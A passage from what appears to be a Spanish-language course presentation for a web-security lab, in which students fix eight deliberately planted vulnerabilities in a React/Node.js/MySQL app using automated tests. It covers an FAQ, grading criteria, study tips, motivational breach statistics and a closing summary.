**Q: ¿Qué pasa si un test sigue fallando?**
A: Lee los mensajes de error, revisa las instrucciones en el test.

**Q: ¿Puedo modificar los tests?**
A: No, los tests validan las correcciones correctamente.

---

## 🎓 Evaluación

### Criterios

| Aspecto | Puntos | Descripción |
|---------|--------|-------------|
| Tests Pasando | 40% | 8/8 vulnerabilidades corregidas |
| Calidad del Código | 20% | Código limpio, comentado |
| Documentación | 20% | Explicaciones claras |
| Comprensión | 20% | Demo y defensa oral |

### Entrega

- **Fecha límite**: [TBD]
- **Formato**: Repositorio Git + Documento PDF
- **Demo**: Presentación de 10 minutos

---

## 💡 Tips para el Éxito

### Recomendaciones

1. **Lee el código vulnerable primero** - Entiende qué hace
2. **Prueba la explotación manualmente** - Verifica el riesgo
3. **Lee las instrucciones del test** - Están muy detalladas
4. **Implementa paso a paso** - Una vulnerabilidad a la vez
5. **Ejecuta los tests frecuentemente** - Feedback inmediato
6. **Consulta la documentación** - OWASP, MDN, etc.
7. **Pregunta si te trabas** - No pierdas tiempo
8. **Documenta mientras trabajas** - No al final
9. **Haz commits descriptivos** - Historial claro
10. **Prueba la app funcionalmente** - No solo los tests

---

## 🌟 ¿Por Qué es Importante?

### Impacto Real

- 💰 **Costo promedio de una brecha**: $4.45M (IBM 2023)
- 📈 **Ataques aumentan 38%** año tras año
- 🎯 **95% de brechas** por error humano
- 🔐 **Demanda de expertos** en ciberseguridad

### Tu Carrera

- 📚 Conocimiento práctico y aplicable
- 💼 Portfolio para mostrar a empleadores
- 🛡️ Mentalidad de seguridad desde el inicio
- 🚀 Habilidades demandadas en la industria

---

## 🙏 Conclusión

### Resumen

✅ Aplicación full-stack con 8 vulnerabilidades críticas
✅ Metodología TDD con tests automatizados
✅ Stack moderno: React + Vite + Node.js + MySQL
✅ Aprendizaje práctico de seguridad web
✅ Correcciones basadas en mejores prácticas

### Siguiente Paso

🚀 **¡Manos a la obra!**

```bash
docker compose up --build
```

### Contacto

- **Repositorio**: [GitHub Link]
- **Documentación**: README.md, CLAUDE.md
- **Dudas**: [email/discord/etc]

---

## ¡Gracias!

**¿Preguntas?**

🔒 Recuerda: La seguridad no es un producto, es un proceso continuo.

---
